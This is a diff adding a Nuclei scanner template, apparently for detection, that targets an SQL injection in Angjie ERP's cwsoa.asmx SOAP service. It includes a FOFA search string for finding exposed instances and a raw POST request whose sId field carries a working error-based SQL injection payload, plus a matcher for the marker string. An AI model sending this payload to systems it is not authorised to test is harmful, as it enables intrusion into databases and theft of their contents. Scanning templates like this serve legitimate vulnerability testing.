@@ -1,0 +1,43 @@
+id: angjie-cwsoa-sqli
+ 
+info:
+  name: 昂捷-ERP-SQL注入-cwsoa
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="昂捷ERP"
+    昂捷ERP cwsoa.asmx 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。
+  reference: |
+    -
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        SOAPAction: http://tempuri.org/GetOAById
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 322
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+          <soap:Header/>
+          <soap:Body>
+              <tem:GetOAById>
+                <!--type: string-->
+                <tem:sId>1' AND 2918 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (2918=2918) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(120)+CHAR(113)))-- QMjY</tem:sId>
+              </tem:GetOAById>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==500 && contains_all(body,'qzjvq1qxkxq')"
